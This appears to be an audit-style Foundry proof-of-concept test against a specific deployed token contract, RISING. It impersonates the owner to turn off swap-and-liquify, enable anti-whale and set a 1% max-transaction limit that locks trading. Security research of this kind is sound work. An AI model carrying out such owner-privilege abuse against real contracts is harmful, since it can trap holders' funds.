// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface RISING {
    function owner() external view returns (address);
    function enableAntiwhale(bool value) external;
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function manualLaunchOverride(bool value) external;
    function setSwapAndLiquifyEnabled(bool toggle) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x33555617F481be5973E93b432d8ecEa2D20524be;
    address attacker = address(this);
    RISING rising;
    address OWNER;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        rising = RISING(TARGET);
        OWNER = rising.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        vm.startPrank(OWNER);
        rising.setSwapAndLiquifyEnabled(false);
        rising.enableAntiwhale(true);
        // 0 reverts in current contract; 1 still imposes an extreme tx lock policy.
        rising.setMaxTxPercent(1);
        vm.stopPrank();

        assertGt(rising._maxTxAmount(), 0, "_maxTxAmount not updated");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
